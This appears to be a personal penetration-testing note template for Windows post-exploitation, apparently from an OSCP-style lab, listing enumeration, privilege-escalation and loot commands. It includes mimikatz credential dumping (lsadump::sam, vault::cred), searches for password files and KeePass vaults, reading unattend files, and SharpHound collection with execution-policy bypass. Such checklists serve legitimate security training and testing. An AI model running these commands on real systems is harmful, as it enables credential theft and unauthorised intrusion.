<% tp.file.rename("2_loot_Windows")%>
Hostname `hostname`
	

## PrivEsc Relevant (winPEAS und adPEAS script?)

##### Users
```powershell
Get-LocalUser
```
(Alternative: `net user`)
```powershell
Get-LocalGroup
```
(Alternative: `net localgroup`)
(Of interest: Non-standard groups, _Administrators_, _Backup Operators_ (Universal file access), _Remote Desktop Users_ (RDP), and _Remote Management Users_ (WinRM))
```powershell
Get-LocalGroupMember administrators
```
Alternative: `net localgroup administrators`
```powershell
net user /domain
```
	

##### Privileges:
```powershell
whoami /all
```

```powershell
reg query "HKU\S-1-5-19"
```
(_SeImpersonatePrivilege_ or _SeAssignPrimaryToken_ -> Named Pipes [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) or Juicy/Rotten/Sweet Potato)
(Also of interest: _SeBackupPrivilege_, _SeLoadDriver_, and _SeDebug_)
	
Example for administrative, non-vulnerable account:
	```
	Group Name                                                    Type             SID          Attributes
	============================================================= ================ ============ ==================================================
	Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
	NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only
	BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only
	BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
	NT AUTHORITY\REMOTE INTERACTIVE LOGON                         Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
	NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
	NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
	NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
	NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
	LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
	NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
	Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192
	``` https://learn.microsoft.com/de-de/windows-server/identity/ad-ds/manage/understand-special-identities-groups
##### Working Dir for attack
```powershell
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```
	
##### Passwords (mimikatz)
```powershell
privilege::debug
```

```powershell
token::elevate
```

```powershell
lsadump::sam
```
(lsadump::lsa /patch ??)
```powershell
vault::cred /patch
```
	
##### SysInfo
```powershell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```
(See: https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions)
	
##### Interesting user files
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -Include *password* -Include proof.txt -Include local.txt -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

##### Running processes
```powershell
tasklist /SVC
```
	
(Alternative: `Get-Process`)
Standard processes:
	AggregatorHost
	CompatTelRunner
	conhost
	csrss
	ctfmon
	dllhost
	dwm
	fontdrvhost
	LogonUI
	lsass
	MicrosoftEdgeUpdate
	msdtc
	MsMpEng
	rdpclip
	RuntimeBroker
	SearchHost
	SearchIndexer
	SecurityHealthSystray/-Service
	services
	SgrmBroker
	ShellExperienceHost
	sihost
	smss
	StartMenuExperienceHost
	svchost
	taskhostw
	tasklist
	vm3dservice
	vmtoolsd
	wininit
	winlogon
	WmiApSrv
	WmiPrvSE
	WUDFHost
##### Installed programs
```powershell
wmic product get name"," version"," vendor
```
	
 (Alternative: `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname` (32-bit) and `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`. Also, check the _Program Files_ directories as this list might be incomplete)
##### Services
```powershell
wmic service get name","displayname","pathname","startmode |findstr /i "auto" |findstr /i /v "c:\windows\\"
```
Alternatives: `Get-Service` or
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,StartMode,PathName | Where-Object {$_.State -like 'Running'}
```
Check if non-default services have files with lax write-permissions (W or F):
```powershell
icacls $file
```
(Alternative: `Get-ACL`)
Also check if any of the pathnames are unquoted but contain spaces. e.g. with: `wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """`
	
##### Scheduled tasks
```powershell
schtasks /query /fo LIST /v
```
(Alternative: `Get-ScheduledTask`)
```powershell
schtasks /query /fo CSV /v | ConvertFrom-Csv | where { $_.Status -ne "Disabled" } | where { $_.Author -notlike "*Microsoft*" } | where { $_.Author -notlike "*N/A*" } | where { $_.Author -ne "Author" }
```

```powershell
schtasks /query /fo CSV /v | ConvertFrom-Csv | where { $_.Status -ne "Disabled" } | where { $_."Run As User" -like "SYSTEM" }
```
	
##### Systemwide patches
```powershell
wmic qfe get Caption"," Description"," HotFixID"," InstalledOn
```
	
##### History
```powershell
Get-History
```

```powershell
(Get-PSReadlineOption).HistorySavePath | cat -
```


## Loot for later
##### Home folder
```powershell
dir /B /S /A-D
```

```powershell
Get-ChildItem -Recurse -Path C:\Users\offsec | select Parent,Name
```
	
##### Network interfaces
```powershell
ipconfig /all
```
	
##### Firewall settings
```powershell
netsh advfirewall show currentprofile, netsh advfirewall firewall show rule name=all
```
	
##### Gateways
```powershell
route print
```
	
##### Listeners/Connections
```powershell
netstat -ano
```
	
##### Mounted Volumes
```powershell
mountvol
```
	
##### Drivers	
```powershell
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object "Display Name", "Start Mode", "Path"
```
	
##### Devices
```powershell
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer
```
	
##### Softwareverteilung?
```powershell
cat c:\sysprep.inf
```

```powershell
cat c:\sysprep\sysprep.xml
```

```powershell
cat %WINDIR%\Panther\Unattend\Unattended.xml
```

```powershell
cat %WINDIR%\Panther\Unattended.xml
```
	
Shadow Copy?
```powershell
vssadmin list shadows
```

```powershell
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
	


# Bloodhound
Kali:
```bash
sudo apt-get install neo4j bloodhound && sudo neo4j console && bloodhound
```

```bash
scp SharpHound.exe $user@$hip:"C:\\Users\\$user\\Downloads"
```

Victim:
```powershell
powershell -ep bypass
```

```powershell
cd Downloads
```

```powershell
.\SharpHound.exe --CollectionMethods All --zipfilename data.zip -d $dnsserver
```





# Findings